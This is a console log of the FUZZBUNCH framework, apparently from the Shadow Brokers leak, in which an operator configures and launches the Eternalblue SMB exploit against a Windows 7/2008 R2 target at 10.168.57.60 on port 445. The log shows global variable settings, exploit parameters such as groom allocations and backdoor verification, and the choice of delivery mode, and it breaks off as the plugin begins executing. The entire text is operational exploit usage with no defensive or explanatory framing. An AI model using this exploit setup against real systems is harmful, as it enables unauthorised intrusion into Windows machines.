fb Special (Eternalblue) > autorun
[*] Autorun OFF

fb Special (Eternalblue) > setg FbStorage G:\shadowbroker\storage
[+] Set FbStorage => G:\shadowbroker\storage
fb Special (Eternalblue) > set

Module: Eternalblue
===================

Name                  Value                                                 
----                  -----                                                 
NetworkTimeout        60                                                    
TargetIp              192.168.1.1                                           
TargetPort            445                                                   
VerifyTarget          False                                                 
VerifyBackdoor        True                                                  
MaxExploitAttempts    3                                                     
GroomAllocations      12                                                    
Target                WIN72K8R2                                             

fb Special (Eternalblue) > 
fb Special (Eternalblue) > 
fb Special (Eternalblue) > 
fb Special (Eternalblue) > script test.sh
fb Special (Eternalblue) > use EternalBlue

[!] Entering Plugin Context :: Eternalblue
[*] Applying Global Variables
[+] Set NetworkTimeout => 60
[+] Set TargetIp => 10.168.57.60

fb Special (Eternalblue) > setg NetworkTimeout 10
[+] Set NetworkTimeout => 10
fb Special (Eternalblue) > setg TargetIP 10.168.57.60
[+] Set TargetIP => 10.168.57.60
fb Special (Eternalblue) > execute

[!] Preparing to Execute Eternalblue

[*]  Mode :: Delivery mechanism

   *0) FB       Traditional deployment from within FUZZBUNCH
    1) DANE     Forward deployment via DARINGNEOPHYTE

[+] Run Mode: 0


Module: Eternalblue
===================

Name                  Value                                                 
----                  -----                                                 
DaveProxyPort         0                                                     
NetworkTimeout        60                                                    
TargetIp              10.168.57.60                                          
TargetPort            445                                                   
VerifyTarget          False                                                 
VerifyBackdoor        True                                                  
MaxExploitAttempts    3                                                     
GroomAllocations      12                                                    
ShellcodeBuffer                                                             
Target                WIN72K8R2                                             

[*] Executing Plugin
